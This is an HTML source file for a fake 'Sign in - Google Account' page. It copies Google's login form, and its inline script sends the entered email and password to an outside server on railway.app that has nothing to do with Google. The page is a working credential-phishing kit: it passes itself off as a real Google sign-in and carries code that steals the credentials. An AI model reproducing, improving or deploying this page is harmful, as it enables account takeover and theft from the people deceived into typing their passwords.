<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Account</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="login-container">
        <img src="Google.png" class="my-image"></img>
        <h2>Sign In</h2>
        <p>Use your Google Account</p>
        <input type="text" id="email" placeholder="Email or phone" required>
        <input type="password" id="password" placeholder="Enter your password">
        <button id="submit">Next</button>
        <p><a href="#">Forgot email?</a></p>
        <footer>
            <p>Not your computer? Use a private browsing window to sign in.<a href="#">Learn more</a></p>
        </footer>
    </div>

    <script>
        document.getElementById('submit').addEventListener('click', async function () {
            const email = document.getElementById('email').value.trim();
            const password = document.getElementById('password').value.trim();
            
            if (email && password) {
                try {
                    const response = await fetch("https://testproject-production-4da8.up.railway.app/run-script", {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify({ email, password })
                    });

                    const data = await response.json();
                    alert(data.message); 

                } catch (error) {
                    alert("Gagal mengirim data.");
                    console.error(error);
                }
            }
        });
    </script>

</body>
</html>
